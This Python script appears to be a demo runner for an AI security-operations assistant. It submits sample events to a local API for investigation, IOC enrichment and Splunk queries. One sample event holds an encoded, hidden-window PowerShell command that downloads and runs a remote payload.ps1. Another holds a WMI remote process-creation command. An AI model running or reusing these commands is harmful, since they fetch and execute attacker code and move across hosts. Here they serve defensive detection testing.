#!/usr/bin/env python3
"""
AI SOC Assistant - Demo Runner (Cross-Platform)
Executes all demo scenarios and captures output.

Usage:
  Windows PowerShell:  python demo_runner.py [demo_name]
  macOS / Linux:       python3 demo_runner.py [demo_name]

Available demos:
  comprehensive  - Full 5-stage investigation (PowerShell attack)
  nlquery        - Natural language to SPL queries
  enrich         - IOC enrichment (IP, domain, hash)
  websearch      - Web search for threat intelligence
  falsepositive  - Benign event (should classify as low severity)
  correlation    - Detection rules & mock alerts
  ai_analyze     - Direct LLM analysis
  mitre          - MITRE ATT&CK technique research

Run all:  python demo_runner.py
Run one:  python demo_runner.py comprehensive
"""
import json
import sys
import urllib.request
import time

BASE_URL = "http://localhost:8080"
RESULTS = {}

def api_call(method, path, data=None, timeout=180):
    """Make API call and return parsed JSON"""
    url = f"{BASE_URL}{path}"
    headers = {"Content-Type": "application/json"}

    if data:
        body = json.dumps(data).encode("utf-8")
        req = urllib.request.Request(url, data=body, headers=headers, method=method)
    else:
        req = urllib.request.Request(url, headers=headers, method=method)

    try:
        resp = urllib.request.urlopen(req, timeout=timeout)
        return json.loads(resp.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

def section(title):
    print(f"\n{'='*60}")
    print(f"  {title}")
    print(f"{'='*60}\n")

def run_demo(demo_name):
    """Run specific demo by name"""

    if demo_name == "comprehensive":
        section("DEMO 1: Comprehensive Investigation - PowerShell Attack")
        print("[*] Submitting encoded PowerShell event for full investigation...")
        print("[*] This triggers: Splunk queries + Threat Intel + Web Search + LLM Analysis")
        print("[*] Please wait (30-60 seconds)...\n")

        result = api_call("POST", "/api/investigate/comprehensive", {
            "event_data": {
                "_time": "2026-02-11T10:35:00+05:30",
                "event_type": "process_creation",
                "host": "WORKSTATION05",
                "user": "jsmith",
                "parent_process": "explorer.exe",
                "process": "powershell.exe",
                "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA1AC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=",
                "pid": 4532,
                "ppid": 2048,
                "src_ip": "185.220.101.45"
            }
        })
        RESULTS["comprehensive"] = result
        print(json.dumps(result, indent=2))

    elif demo_name == "nlquery":
        section("DEMO 2: Natural Language Splunk Query")

        queries = [
            "Show me all failed login attempts",
            "What PowerShell executions happened recently?",
            "Show me lateral movement activity",
            "What activity came from IP 185.220.101.45?"
        ]

        for q in queries:
            print(f"[*] Question: \"{q}\"")
            result = api_call("POST", "/api/splunk-mcp/ask", {"question": q})
            RESULTS[f"nlquery_{q[:20]}"] = result
            print(f"[+] Generated SPL: {result.get('generated_spl', 'N/A')}")
            print(f"[+] Results: {result.get('result_count', 0)} events found")
            if result.get("results"):
                print(f"[+] Sample: {json.dumps(result['results'][:3], indent=2)}")
            print()

    elif demo_name == "enrich":
        section("DEMO 3: IOC Enrichment")

        indicators = [
            ("185.220.101.45", "ip"),
            ("evil-c2-server.com", "domain"),
            ("a1b2c3d4e5f6789012345678901234567890abcd", "hash")
        ]

        for ioc, ioc_type in indicators:
            print(f"[*] Enriching {ioc_type}: {ioc}")
            result = api_call("POST", "/api/enrich/ioc", {"indicator": ioc})
            RESULTS[f"enrich_{ioc_type}"] = result
            print(json.dumps(result, indent=2))
            print()

    elif demo_name == "websearch":
        section("DEMO 4: Web Search - Threat Intelligence")

        print("[*] Searching: 'PowerShell encoded command attack detection'")
        result = api_call("POST", "/api/search/web", {
            "query": "PowerShell encoded base64 command attack MITRE T1059.001",
            "num_results": 5
        })
        RESULTS["websearch"] = result
        print(json.dumps(result, indent=2))

    elif demo_name == "falsepositive":
        section("DEMO 5: False Positive Scenario")
        print("[*] Submitting BENIGN PowerShell event (legitimate admin command)...")
        print("[*] Expected: AI should classify as false_positive / benign\n")

        result = api_call("POST", "/api/investigate/comprehensive", {
            "event_data": {
                "_time": "2026-02-11T14:00:00+05:30",
                "event_type": "process_creation",
                "host": "ADMIN-PC",
                "user": "sysadmin",
                "parent_process": "explorer.exe",
                "process": "powershell.exe",
                "command_line": "powershell.exe Get-Service | Where-Object {$_.Status -eq 'Running'}",
                "pid": 1234,
                "ppid": 5678
            }
        })
        RESULTS["falsepositive"] = result
        print(json.dumps(result, indent=2))

    elif demo_name == "correlation":
        section("DEMO 6: Correlation Rules & Mock Alerts")

        print("[*] Listing all detection rules...")
        rules = api_call("GET", "/api/rules")
        RESULTS["rules"] = rules
        print(json.dumps(rules, indent=2))

        print("\n[*] Generating mock brute force alert (5 failed logins)...")
        mock = api_call("POST", "/api/mock/generate", {
            "alert_type": "failed_login_burst",
            "count": 5
        })
        RESULTS["mock_bruteforce"] = mock
        print(json.dumps(mock, indent=2))

        print("\n[*] Generating mock encoded PowerShell alert...")
        mock2 = api_call("POST", "/api/mock/generate", {
            "alert_type": "powershell_encoded",
            "count": 1
        })
        RESULTS["mock_powershell"] = mock2
        print(json.dumps(mock2, indent=2))

    elif demo_name == "ai_analyze":
        section("DEMO 7: LLM AI Analysis (Direct)")

        print("[*] Sending lateral movement event to Gemini AI for analysis...")
        result = api_call("POST", "/api/ai/analyze", {
            "event_data": {
                "event_type": "lateral_movement",
                "host": "WORKSTATION05",
                "user": "svc_backup",
                "dest_host": "FILESERVER01",
                "dest_ip": "10.0.1.100",
                "method": "WMI",
                "command": "wmic /node:FILESERVER01 process call create cmd.exe"
            }
        })
        RESULTS["ai_analyze"] = result
        print(json.dumps(result, indent=2))

    elif demo_name == "mitre":
        section("DEMO 8: MITRE ATT&CK Research")

        print("[*] Researching MITRE T1059.001 (PowerShell)...")
        result = api_call("GET", "/api/research/mitre/T1059.001")
        RESULTS["mitre"] = result
        print(json.dumps(result, indent=2))


if __name__ == "__main__":
    demos = sys.argv[1:] if len(sys.argv) > 1 else [
        "comprehensive", "nlquery", "enrich", "websearch",
        "falsepositive", "correlation", "ai_analyze", "mitre"
    ]

    print("=" * 60)
    print("  AI SOC ASSISTANT - LIVE DEMO EXECUTION")
    print(f"  Running {len(demos)} demo scenario(s)")
    print("=" * 60)

    for demo in demos:
        try:
            run_demo(demo)
        except Exception as e:
            print(f"[ERROR] Demo '{demo}' failed: {e}")

    # Save all results
    with open("demo_results.json", "w") as f:
        json.dump(RESULTS, f, indent=2, default=str)

    print(f"\n{'='*60}")
    print(f"  ALL DEMOS COMPLETE - Results saved to demo_results.json")
    print(f"{'='*60}")
